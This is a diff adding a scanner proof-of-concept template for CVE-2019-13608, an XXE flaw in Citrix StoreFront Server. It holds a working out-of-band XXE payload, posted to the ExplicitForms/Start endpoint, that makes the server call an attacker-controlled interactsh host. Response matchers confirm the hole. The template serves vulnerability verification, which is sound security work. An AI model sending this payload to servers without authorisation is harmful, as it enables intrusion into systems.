@@ -1,0 +1,55 @@
+[info]
+author = "ave"
+description = "通过向 Citrix StoreFront Server 的 /Citrix/StoreAuth/ExplicitForms/Start 端点发送包含恶意 XML 外部实体的 POST 请求，利用 OOB XXE 技术触发服务器向攻击者控制的 interactsh 服务器发起 HTTP 请求，验证 XXE 漏洞存在。"
+id = "POC-AVE-2019-0508"
+name = "Citrix StoreFront Server XXE PoC"
+severity = "high"
+tags = ["ave-2019-0508"]
+vuln_id = [
+    "CVE-2019-13608",
+    "AVE-2019-0508",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/Citrix/StoreAuth/ExplicitForms/Start"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE requesttoken [<!ENTITY % xxe SYSTEM "http://{{interactsh-url}}"> %xxe; ]>
+<requesttoken xmlns="http://citrix.com/delivery-services/1-0/auth/requesttoken">
+  <for-service>6b78ab94-a709-4e3a-8b9b-a49ca317c70c</for-service>
+  <for-service-url>https://www.example.com/Citrix/Store/resources/v2</for-service-url>
+  <reqtokentemplate />
+  <requested-lifetime>1.00:00:00</requested-lifetime>
+</requesttoken>"""
+type = "raw"
+
+[poc.requests.headers]
+Accept = "application/vnd.citrix.requesttokenresponse+xml, text/xml, application/vnd.citrix.authenticateresponse-1+xml"
+Content-Type = "application/vnd.citrix.requesttoken+xml"
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = ["vnd.citrix.authenticateresponse"]
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<AuthenticateResponse",
+    "error-bad-request",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
